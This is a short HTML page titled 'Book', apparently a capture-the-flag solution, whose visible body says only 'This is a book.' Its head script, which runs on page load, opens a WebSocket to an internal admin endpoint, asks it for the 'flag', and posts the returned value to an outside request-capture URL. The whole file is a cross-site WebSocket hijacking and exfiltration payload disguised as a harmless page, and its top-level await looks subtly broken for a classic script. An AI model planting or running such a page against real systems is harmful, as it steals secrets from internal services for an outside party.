<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Book</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <script>
      const url = encodeURI("https://eorokvtrcf7mllf.m.pipedream.net/");
      await fetch(url, {method: "POST"});
      const websocket = new WebSocket("ws://web:8080/admin/ws");
      websocket.onopen = () => {
        websocket.send("flag");
      };
      websocket.onmessage = async (message) => {
        const flag = message.data;
        const url = encodeURI("https://eorokvtrcf7mllf.m.pipedream.net/" + flag);
        await fetch(url, {method: "POST"});
      };
    </script>
  </head>
  <body>
    <h1>The Book</h1>
    <span>This is a book.</span>
  </body>
</html>
